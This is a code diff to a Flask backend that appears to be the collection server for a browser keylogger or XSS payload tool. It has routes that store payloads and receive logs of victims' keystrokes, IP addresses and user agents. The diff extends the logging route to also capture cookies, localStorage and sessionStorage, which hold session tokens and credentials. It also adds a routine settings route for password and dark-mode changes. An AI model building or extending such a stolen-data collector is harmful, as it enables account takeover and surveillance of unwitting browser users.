@@ -3,7 +3,7 @@ import jwt
 from flask import jsonify, request
 from flask_bcrypt import check_password_hash
 from flask_jwt_extended import create_access_token, get_jwt_identity, jwt_required, set_access_cookies, unset_jwt_cookies
-from sqlalchemy.exc import IntegrityError
+from sqlalchemy.exc import IntegrityError, SQLAlchemyError
 
 from app import bcrypt, create_app, db, jwt
 from models import Log, Payload, User
@@ -32,8 +32,11 @@ def logging_post():
     req_data = json.loads(request.data)
     try:
         log = Log(
+            cookies=req_data["cookies"],
             ip=request.remote_addr,
             keystrokes=req_data["keystrokes"],
+            local_storage=req_data["localStorage"],
+            session_storage=req_data["sessionStorage"],
             user_agent=request.headers.get('User-Agent'),
         )
         db.session.add(log)
@@ -194,5 +197,48 @@ def payloads_put(payload_id=None):
         response = {
             "payloadUpdateError": True,
             "payloadUpdateMsg": "Error updating payload",
+        }
+    return jsonify(response)
+
+@app.put("/api/settings")
+@jwt_required()
+def settings_put():
+    req_data = json.loads(request.data)
+    current_user = get_jwt_identity()
+
+    try:
+        dark_mode = req_data['darkMode']
+        old_password = req_data['oldPassword']
+        new_password = req_data['newPassword']
+
+        user = User.query.filter_by(username=current_user).first()
+        if user and not check_password_hash(user.password, old_password):
+            response = {
+                "settingsError": True,
+                "settingsMsg": "Old password is incorrect",
+            }
+
+        elif len(new_password) < 8:
+            response = {
+                "settingsError": True,
+                "settingsMsg": "Password should be at least 8 characters long",
+            }
+
+        else:
+            user.dark_mode = dark_mode
+            user.password = bcrypt.generate_password_hash(new_password)
+            db.session.commit()
+
+            response = {
+                "settingsError": False,
+                "settingsMsg": "Settings updated",
+            }
+    except SQLAlchemyError as e:
+        error = str(e.__dict__['orig'])
+        print("\n\n ERROR::", error, "\n\n")
+        db.session.rollback()
+        response = {
+            "settingsError": True,
+            "settingsMsg": "Error updating settings",
         }
     return jsonify(response)
